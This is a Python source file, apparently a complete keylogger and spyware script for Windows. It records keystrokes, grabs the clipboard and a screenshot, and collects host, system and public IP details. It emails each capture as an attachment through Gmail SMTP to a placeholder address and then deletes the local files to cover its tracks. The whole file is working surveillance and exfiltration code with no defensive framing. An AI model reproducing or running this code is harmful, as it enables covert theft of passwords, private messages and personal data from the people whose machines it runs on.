from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key,Listener
import time
import datetime
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process,freeze_support
from PIL import ImageGrab



keys_information = "key_logs.txt"
system_information = "systeminfo.txt"
clipboard_informtion = "clipboard.txt"
scrshot= "screenshot.png"

email_address = "from_address"
password = "password"
to_address = "to_address"

file_path = "path_for_storage"
extend = "\\"

def send_email(filename,attachment,to_address):
    from_address = email_address
    msg = MIMEMultipart()
    msg['From'] = from_address
    msg['To'] = to_address
    msg['Subject'] = "Log File"
    body = "body"
    msg.attach(MIMEText(body,'plain'))
    filename = filename
    attachment = open(attachment,'rb')
    p = MIMEBase('application','octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition','Attachment:filename = %s' % filename)
    msg.attach(p)
    s=smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(from_address,password)
    text = msg.as_string()
    s.sendmail(from_address,to_address,text)
    s.quit()

def screenshot():
    image = ImageGrab.grab()
    image.save(file_path + extend + scrshot)
    send_email(keys_information,file_path+extend+scrshot,to_address)

screenshot()

def copy_clipboard():
    with open(file_path+extend+clipboard_informtion,'a') as f:
        f.write(str(datetime.datetime.now()))
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data : \n" + pasted_data )
        except:
            f.write(" clipboard couldnot be accessed (non text data)")

copy_clipboard()
send_email(keys_information,file_path+extend+clipboard_informtion,to_address)

def comp_info():
    with open(file_path+extend+system_information,'a') as f:
        host_name = socket.gethostname()
        IP_Address = socket.gethostbyname(host_name)
        
        f.write(str(datetime.datetime.now()))
        f.write("processor : "+ platform.processor()  + '\n')
        f.write("System : "+ platform.system() + " " + platform.version() +'\n')
        f.write("Machine : "+ platform.machine()+ '\n')
        f.write("Hostname : "+ host_name)
        f.write("Private IP : "+ IP_Address + '\n')
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address : "+ public_ip)
        except:
            f.write("ERROR, could not get the ip address")

comp_info()
send_email(keys_information,file_path+extend+system_information,to_address)    
        
with open(file_path+extend+keys_information,'a') as f:
    f.write(str(datetime.datetime.now()))

def write_file(key):
    with open(file_path+extend+keys_information,'a') as f:
        key_data = str(key)
        key_data = key_data.replace("'","")

        if key_data == "Key.space":
            key_data=" "
        if key_data == "Key.enter":
            key_data="\n"
        print(key_data)
        f.write(key_data)
    

def on_release(key):
    if key == Key.esc:
        send_email(keys_information,file_path+extend+keys_information,to_address)
        return False

with Listener(on_press=write_file,on_release=on_release) as listener:
    listener.join()    


os.remove(file_path+extend+keys_information)
os.remove(file_path+extend+system_information)
os.remove(file_path+extend+clipboard_informtion)
os.remove(file_path+extend+scrshot)


